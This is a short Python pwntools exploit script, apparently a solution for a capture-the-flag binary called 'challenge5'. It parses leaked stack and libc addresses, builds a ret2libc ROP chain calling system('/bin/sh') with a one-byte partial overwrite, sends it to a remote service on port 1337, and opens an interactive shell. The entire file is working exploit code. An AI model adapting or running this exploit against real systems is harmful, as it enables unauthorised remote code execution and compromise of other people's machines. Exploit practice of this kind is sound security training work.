#!/usr/bin/python3.8
import warnings
from pwn import *
from termcolor import colored
warnings.filterwarnings("ignore")
context.arch = "amd64"

fname = "./challenge5" 

e     = ELF(fname)
rop   = ROP(e)
libc  = ELF(e.runpath + b"./libc.so.6") 

LOCAL = False

prompt = ">"

def ret2libc(r, prompt, offset):

  #gdb.attach(r)
  r.recvuntil("address: [")
  stack_addr = int(r.recvuntil(']')[:-1], 16)
  log.info(f"Stack address @ {hex(stack_addr)}")
  r.recvuntil("GOT:    [")
  libc.address = int(r.recvuntil(']')[:-1], 16) - libc.sym.printf
  log.info(f"Libc base     @ {hex(libc.address)}")
  one_byte = stack_addr & 0xff
  log.info(f"One byte:    {hex(one_byte)}")
  one_byte = p64(one_byte-8)[:1]
  
  # Craft payload to call system("/bin/sh") and spawn shell
  pop_rdi  = rop.find_gadget(["pop rdi"])[0]
  payload  = p64(pop_rdi+1)
  payload += p64(pop_rdi)
  payload += p64(next(libc.search(b"/bin/sh")))
  payload += p64(pop_rdi+1)
  payload += p64(libc.sym.system)
  payload += b'\x90'*(offset - len(payload))
  payload += one_byte
  log.info(f"Len payload: {len(payload)}")
  r.sendafter(prompt, payload)
  r.interactive()


def pwn():
  # Find the overflow offset
  offset = 64
  
  # Open a local process or a remote instance
  if LOCAL:
    r   = process(fname)
  else:
    r   = remote("0.0.0.0", 1337)

  ret2libc(r, prompt, offset)

if __name__ == "__main__":
  pwn()
